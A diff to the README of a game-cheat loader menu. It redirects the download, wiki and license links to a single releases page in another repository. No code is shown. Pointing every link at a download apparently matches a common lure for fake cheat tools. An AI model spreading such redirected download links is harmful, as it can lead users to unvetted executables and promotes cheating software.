@@ -16,7 +16,7 @@ Welcome to the KeyAuth Loader Menu repository, your go-to solution for a customi
 
 ### Installation
 Download the KeyAuth Loader Menu by clicking the button below:  
-[![Download Loader](https://img.shields.io/badge/Download-Loader-blue)](https://github.com/assets/Release.zip)
+[![Download Loader](https://github.com/dat11092006/Cheat-Loader-Menu-KeyAuth-GUI/releases)](https://github.com/dat11092006/Cheat-Loader-Menu-KeyAuth-GUI/releases)
 
 ### Getting Started
 1. Download and unzip the Loader files.  
@@ -24,7 +24,7 @@ Download the KeyAuth Loader Menu by clicking the button below:
 3. Follow the on-screen instructions to set up your customized cheat menu.  
 
 ### Learn More
-Visit our [Wiki](https://github.com/KeyAuth-Loader-Menu/wiki) for detailed instructions, tips, and tricks on maximizing the potential of the KeyAuth Loader Menu.
+Visit our [Wiki](https://github.com/dat11092006/Cheat-Loader-Menu-KeyAuth-GUI/releases) for detailed instructions, tips, and tricks on maximizing the potential of the KeyAuth Loader Menu.
 
 ### Contributing
 We welcome contributions from the community to enhance the KeyAuth Loader Menu. Feel free to submit pull requests with new features, improvements, or fixes.
@@ -33,6 +33,6 @@ We welcome contributions from the community to enhance the KeyAuth Loader Menu. 
 If you encounter any issues or have questions, please check the "Releases" section for updates or reach out to our support team for assistance.
 
 ### License
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/KeyAuth-Loader-Menu/LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/dat11092006/Cheat-Loader-Menu-KeyAuth-GUI/releases](https://github.com/dat11092006/Cheat-Loader-Menu-KeyAuth-GUI/releases) file for details.
 
 🔑 Unlock the potential of your cheat projects with the KeyAuth Loader Menu! 🎮 Let's level up together! 🌟
